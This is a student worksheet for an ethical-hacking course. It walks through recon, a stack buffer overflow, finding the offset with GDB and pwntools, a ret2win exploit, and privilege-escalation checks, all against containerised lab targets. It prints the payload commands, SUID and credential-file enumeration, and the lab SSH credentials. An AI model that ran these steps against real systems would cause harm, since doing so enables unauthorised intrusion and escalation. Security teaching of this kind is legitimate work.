# Week 10: Exploit Development
## CYB204 Ethical Hacking — Student Worksheet

---

## Before We Start (5 minutes)

### Important Rules
✅ **DO:** Only exploit targets within this lab environment
✅ **DO:** Read the source code in `/root/tools/vuln.c` — understanding the bug is part of the exercise
✅ **DO:** Save every GDB output and working payload — you'll need this for Assessment 2
❌ **DON'T:** Attempt buffer overflow attacks on any real system without authorisation
❌ **DON'T:** Skip the recon phase — this worksheet simulates a real engagement

### Connection to Assessment 2
Assessment 2 is a 3000-word practical pentest report. This lab generates the raw findings you need: recon output, vulnerability discovery, exploit development notes, and post-exploitation evidence.

---

## Setup (5 minutes)

```bash
# Linux / macOS / Git Bash
# Start the lab (allow ~60 seconds for compilation)
make run-week10

# Enter attacker container
docker exec -it week10-attacker bash

# Verify targets
ping -c 1 10.10.10.10 && echo "web-recon: UP" || echo "web-recon: DOWN"
ping -c 1 10.10.10.11 && echo "vuln-target: UP" || echo "vuln-target: DOWN"

# Windows PowerShell / Command Prompt
cd labs\week10 && docker compose up -d
```

---

## Phase 1: Reconnaissance (15 minutes)

### Exercise 1.1: Port Scan

```bash
# Comprehensive scan of the target
# -sV : probe open ports to determine service/version info
# -sC : run nmap's default set of NSE scripts against the target
# -A  : enable OS detection, version detection, script scanning, and traceroute
# -oA <basename> : save output in all three formats (.nmap, .xml, .gnmap)
#                  using this basename
nmap -sV -sC -A 10.10.10.0/24 -oA /tmp/week10-recon
```

**Fill in the discovery table:**

| Host | Port | Service | Version |
|------|------|---------|---------|
| 10.10.10.10 | | | |
| 10.10.10.11 | 22 | | |
| 10.10.10.11 | 9999 | | |

---

### Exercise 1.2: Web Recon

```bash
# Fetch the web page
curl http://10.10.10.10

# Enumerate directories
# dir       : gobuster's directory/file brute-forcing mode
# -u <url>  : target URL to scan
# -w <file> : wordlist of paths to try
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
```

**What clues did the web page give about the target?**

_________________________________

---

### Exercise 1.3: Connect to the Debug Service

```bash
# Probe the debug service manually
nc 10.10.10.11 9999
```

Type a short name and press Enter.

**What does the service print at startup (two lines)?**

_________________________________

**What is the address of `secret_function()` printed by the service?**

`secret_function() is at: ___________________`

**Note:** Write this address down carefully — you will use it in Phase 3.

---

## Phase 2: Vulnerability Analysis (25 minutes)

### Exercise 2.1: Read the Source Code

```bash
cat /root/tools/vuln.c
```

Find the `handle_client()` function and answer:

**How large is `buf`?** _____ bytes

**How many bytes does `read()` accept into `buf`?** _____ bytes

**What is this vulnerability called?** _________________________________

---

### Exercise 2.2: Confirm the Overflow with GDB

SSH into the target to run GDB locally (gives a cleaner debugging experience):

```bash
# SSH credentials: lowpriv / lowpriv123
ssh lowpriv@10.10.10.11

# On the target machine:
gdb /opt/vuln
```

Inside GDB:

```gdb
# Disassemble the vulnerable function
# disas <function> : show the disassembled (x86 assembly) instructions for
#                     that function
disas handle_client

# Note the addresses of the buffer and return address
# info frame : print details of the current stack frame — frame address,
#              saved return address, saved rbp, locals, etc.
info frame
```

**What is the address of `buf` on the stack?** `________________`

**What is the saved return address (`rip`)?** `________________`

---

### Exercise 2.3: Crash the Service

From your attacker machine (in a different terminal):

```bash
docker exec -it week10-attacker bash
# -c : run the given string as a Python program instead of a script file
python3 -c "print('A' * 200)" | nc 10.10.10.11 9999
```

**Did the service crash?**  ✓ Yes  ✓ No

In GDB, set a breakpoint and catch the crash:

```gdb
# run : start (or restart) execution of the program being debugged inside gdb
run
# (after crash) info registers
# info registers : dump the CPU register values, including rip
# Look at rip — is it 0x4141414141414141?
```

**What value is in `rip` after the crash?** `________________`

---

## Phase 3: Exploit Development (30 minutes)

### Exercise 3.1: Find the Exact Offset

Use pwntools to generate a cyclic pattern (de Bruijn sequence):

```bash
# cyclic(200) : pwntools function that builds a 200-byte De Bruijn sequence —
#               a pattern with no repeating substrings — so the exact crash
#               offset can be pinpointed later
python3 -c "from pwn import *; print(cyclic(200).decode())" | nc 10.10.10.11 9999
```

In GDB, the crash value in `rip` (or the segfault address) tells you the exact offset:

```python
# cyclic_find(x) : given a value captured from the crash (e.g. the value in
#                  rip), returns its offset within the cyclic() pattern —
#                  i.e. how many bytes precede the saved return address
python3 -c "from pwn import *; print(cyclic_find(0x<VALUE_FROM_RIP>))"
```

**Exact offset to return address:** _____ bytes

---

### Exercise 3.2: Verify RIP Control

```bash
# Send exactly <offset> A's + 8 B's — if RIP = 0x4242424242424242, you control it
# remote(host, port) : pwntools helper that opens a TCP connection to the target
# recvuntil(bytes)   : read from the connection until this exact byte sequence appears
# send(payload)      : write raw bytes to the connection
# close()            : close the connection
python3 -c "
from pwn import *
offset = <YOUR_OFFSET>
payload = b'A' * offset + b'B' * 8 + b'\n'
p = remote('10.10.10.11', 9999)
p.recvuntil(b': ')
p.send(payload)
p.close()
"
```

**What is in RIP after sending this payload?** `________________`

**Does this confirm RIP control?**  ✓ Yes  ✓ No

---

### Exercise 3.3: ret2win — Jump to secret_function()

The service prints the address of `secret_function()` on startup (you wrote it down in Exercise 1.3). Now redirect execution there:

```bash
python3 /root/tools/exploit_template.py
```

Edit the template's `step3_control_eip()` call with your offset and the `secret_function` address:

```python
# In exploit_template.py, uncomment and fill in:
# offset      : number of junk bytes before the saved return address (Exercise 3.1)
# target_addr : address execution should jump to — here, secret_function()'s
#               address from Exercise 1.3
step3_control_eip(offset=<YOUR_OFFSET>, target_addr=<SECRET_FUNCTION_ADDR>)
```

**Did you get a shell?**  ✓ Yes  ✓ No

**What did `secret_function()` print?**

_________________________________

---

## Phase 4: Privilege Escalation (15 minutes)

If you got a shell from `secret_function()`, it runs as the service user. Now escalate.

### Exercise 4.1: Check Your Current Privileges

```bash
id
whoami
# -l : list the commands (and restrictions) sudo would allow the current user to run
sudo -l
```

**What user are you running as?** _________________________________

**Can you run anything as sudo?** _________________________________

---

### Exercise 4.2: Common Privesc Checks

```bash
# SUID binaries
# -perm -4000 : match files with the SUID bit (octal 4000) set — these run
#               with the file owner's privileges (often root) when executed
# -type f     : only match regular files (not directories, etc.)
# 2>/dev/null : discard "permission denied" errors so only real hits show
find / -perm -4000 -type f 2>/dev/null

# World-writable files
# -writable      : match files the current user can write to
# -type f        : only match regular files
# 2>/dev/null    : discard permission errors
# | grep -v proc : exclude noisy results from the /proc pseudo-filesystem
find / -writable -type f 2>/dev/null | grep -v proc

# Check /etc/passwd for interesting users
# grep -v nologin : exclude accounts whose shell is /usr/sbin/nologin (i.e.
#                    accounts that cannot get an interactive shell)
cat /etc/passwd | grep -v nologin
```

**Note any interesting SUID binaries:**

_________________________________

---

## Phase 5: Reporting Notes (15 minutes)

### Exercise 5.1: Write a Vulnerability Summary

Complete this for your Assessment 2 report:

**Vulnerability:** _________________________________

**Affected Component:** vuln.c `handle_client()`, line ___

**CVSS Score (estimate):** ___  **Severity:** Critical / High / Medium / Low

**Description:**

_________________________________

**Proof of Concept (one sentence):**

_________________________________

**Remediation:**

_________________________________

---

### Exercise 5.2: Compile Protections Analysis

The service was compiled with protections disabled. Fill in what each protection does and why it mattered here:

| Protection | Flag | Effect if ENABLED | Was it enabled? |
|------------|------|-------------------|-----------------|
| Stack canary | `-fstack-protector` | | No |
| PIE | `-pie` | | No |
| Executable stack | `-z noexecstack` | | No |
| ASLR | OS-level | | No (container) |

---

## Quick Knowledge Check

1. What is a stack buffer overflow?
   - A) Overwriting heap memory  B) Writing past the end of a stack buffer, overwriting saved return address  C) Integer overflow  D) Format string attack

2. What does the `-fno-stack-protector` gcc flag do?
   - A) Enables ASLR  B) Disables stack canary  C) Removes PIE  D) Enables NX

3. What is a "ret2win" exploit?
   - A) Injecting shellcode  B) Redirecting execution to an existing function in the binary  C) Return-oriented programming  D) Heap spray

4. True/False: ASLR alone completely prevents buffer overflow exploitation.

5. What pwntools function generates a de Bruijn sequence for offset finding?
   - A) `cyclic()`  B) `pattern_create()`  C) `offset_find()`  D) `bruijn()`

---

## Cleanup

```bash
exit  # exit attacker container
cd labs/week10 && docker compose down
```

---

## Assessment 2 Checklist

After completing this lab, you should have notes covering:

- [ ] Recon: Nmap scan output with services and versions
- [ ] Enumeration: What the web page and debug service revealed
- [ ] Vulnerability: Exact bug (function, line, type)
- [ ] Exploit: Offset, target address, working payload
- [ ] Post-exploitation: User context, privilege escalation attempted
- [ ] Remediation: Compiler flags, input validation, ASLR/canaries

---

## Summary

Today you learned to:
✓ Perform full-chain recon → enum → exploit on a target
✓ Identify a stack buffer overflow from source code
✓ Use GDB and pwntools to find crash offsets and control RIP
✓ Execute a ret2win exploit without shellcode injection
✓ Structure findings for a professional pentest report

**Instructor Contact:** _________________________________


---

## Optional: CTF Challenge

Once you have completed all exercises above, test your skills with an optional Capture The Flag challenge.

See **[ctf-challenge.md](./ctf-challenge.md)** for objectives.

Two flags to capture: `user.txt` and `root.txt`  
Flag format: `flag{...}`  
No hints — instructor walkthrough released at end of session.
